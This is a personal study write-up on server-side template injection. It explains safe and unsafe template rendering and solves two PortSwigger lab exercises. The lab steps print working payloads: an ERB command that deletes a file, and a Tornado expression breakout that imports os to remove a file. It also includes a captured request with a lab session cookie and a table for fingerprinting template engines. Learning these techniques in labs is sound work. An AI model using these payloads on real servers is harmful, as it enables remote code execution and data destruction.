# Server-Side Template Injection (SSTI)

**Overview**
Server-Side Template Injection (SSTI) occurs when user input is unsafely concatenated directly into a template string rather than being passed as a data variable. Template engines (like Twig, Jinja2, or Tornado) are designed to combine fixed templates with volatile data. When an attacker can inject malicious payload syntax into the template itself, the engine compiles and executes it as server-side code.

**Impact**
SSTI is a critical vulnerability that typically results in total system compromise:
* **Remote Code Execution (RCE):** The attacker can execute arbitrary operating system commands on the underlying server.
* **Full Server Takeover:** Complete access to the backend infrastructure, allowing for data theft, malware deployment, and network pivoting.
* **Sensitive Data Exposure:** Reading local configuration files, environment variables, and database credentials directly from the server's file system.

**What We Cover in This File:**
* **The Mechanics of SSTI:** Understanding the critical difference between passing input as data (safe) versus concatenating it into the template source (unsafe).
* **The Two-Phase Rule:** How template engines parse vs. execute data, and the "Golden Rule" of passive data vs. active code.
* **Basic Exploitation (Ruby/ERB):** Using `<%= system(...) %>` syntax to execute OS commands and manipulate the file system.
* **Context-Dependent Exploitation (Tornado):** Forcing verbose backend errors to map the template engine, breaking out of existing variables, and executing Python OS commands.
* **Template Engine Identification:** A quick-reference guide for using math evaluations (e.g., `{{7*7}}`, `${7*7}`) to fingerprint the specific backend template engine.

---

# **What is server-side template injection?**

happens when the developer concatenates the user input with the source template code instead of passing it as data 

so let's examine some example of safe and nonsafe data passing

this one is safe 

```python
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

because the input is passed as static data and it's taken from an array

but this one is not safe

```python
$output = $twig->render("Dear " . $_GET['name']);
```

```python
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

because the name is under the attacker control and it got concatenated with the code directly so the compiler doesn't know if it's static data or can be compiled as part of the code 

here i had a question running in my mind 

what if in the first safe example i went to my profile and updated my name as {{7*7}} and then came back to the page that lists “dear firstname”

the answer that it will not work because template engines work in 

### **Two-Phase rule**

1. **The Compilation/Parsing Phase:** The engine looks at the **template string** (the first argument in `render()`). it searches for special tags like `{{ }}` or `{% %}`. It builds a map of where variables need to go.
2. **The Execution/Rendering Phase:** The engine takes the **data array** (the second argument) and simply drops those values into the spots it mapped out during Phase 1.

so the result will be literally dear {{7*7}}

and wont get compiled cuz  The engine **does not go back** to check if the data it just inserted contains more template code. It treats your input as "Passive Data" (just a bunch of characters), not "Active Code." To the engine, your input `{{7*7}}` is no different than the name "John."

but in the unsafe version it goes like this

1. If `name` is `{{7*7}}`, the final string sent to the `render()` function is `"Dear {{7*7}}"`.
2. **Now Phase 1 begins:** Twig parses this string and sees `{{7*7}}` as **part of the template itself**, not as data.
3. Because it thinks it's part of the instructions provided by the developer, it executes it.

> **The Golden Rule**
> 
> 
> Vulnerabilities happen when **User Input** is treated as **Template Source Code**.
> As long as User Input is kept strictly inside the **Data Array**, the engine treats it as a literal string and won't execute it, no matter what characters ($ , { , % ) it contains.
> 

and the profile update would work if the code is like this 

```python
// VERY BADD: Fetching name from DB and concatenating it into a new template string
$username = $database->fetchName(); 
echo $twig->render("Welcome back, " . $username);
```

In this case, even though the data isn't coming from the URL, it is still being **concatenated** into the template source. This is a **Stored SSTI**.

now lets start solving labs by portswigger ordering

**Exploiting server-side template injection vulnerabilities**

lab1
1) click on first item you get an error message and you recognize that error message is taken from the url cuz the url looks like `https://0a92001c04edd774813316d300d90034.web-security-academy.net/?message=Unfortunately this product is out of stock`

2)as it’s defined in the lab description the it uses ruby language so if you try smth like {{7*7}} it wont work cuz this only works for python so i tried **`<%=7*7%>`** and it printed out 49 

3) time to execute so it wants me to remove a file called morale.txt so i used  `<%= system("rm /home/carlos/morale.txt") %>` to remove the file and the lab is solved

lab2: **Lab: Basic server-side template injection (code context)**

1)found a new function called preferred name that you change it for first-name and once you comment on any blog now the comment has your first name or nickname etc.

2)since this function takes data and call it i tried to capture the POST requests and remove the parameter`blog-post-author-display=` and sent it as null

so now the request looks like 

```python
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a4c00f903b3dd668168c5df00610016.web-security-academy.net
Cookie: session=ZyDWEg7jUXDYWdCprYrdWtofcIMwHUEM
Content-Length: 76
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a4c00f903b3dd668168c5df00610016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4c00f903b3dd668168c5df00610016.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

blog-post-author-display=&csrf=UH3DaNBlbOKyxynsGuJ8bDHoQDsv71uw
```

3)went to check how my name displayed in comment section found a server error 

```python
Internal Server Error
Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 306, in __init__ self.file = _File(self, _parse(reader, self)) File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 862, in _parse reader.raise_parse_error("Empty expression") File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 788, in raise_parse_error raise ParseError(msg, self.name, self.line) tornado.template.ParseError: Empty expression at <string>:1
```

4)this error leaks so many useful informations, that it uses tornado template and that the name is concatenated in such a wrong way that can be mixed with the template code   

5)now i tried test instead of null i got another server error says 

```python
Internal Server Error
Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute NameError: global name 'test' is not defined
```

 `in _tt_execute NameError: global name 'test' is not defined` : 

so now i understand it can't work with empty expression and with random one so i need to use the predefined ones that the server normally uses then ill try to get out of that expression and open a new one

6)so i sent a new POST request with `blog-post-author-display=user.nickname}}{{7*7}}`

and went to the comment section found that it lists my nickname + 49 the new expression i just added means it executes my commands

7)now time to exploit to delete the intended file small search found the syntax of removing command in tornado template sent another request with `blog-post-author-display=user.nickname}}{{ **import**('os').remove('morale.txt') }}` don't forget to URL encode it so it doesn't mess the request 

`${7*7}` →Likely **Smarty** (PHP) or **Mako** (Python)

`{{7*7}}` →Likely **Twig** (PHP) or **Jinja2** (Python)

`{{7*'7'}}`->**Twig** (PHP)  if result is 7777777 →**Jinja2** (Python)

`<%= 7*7 %>` →**ERB** (Ruby)
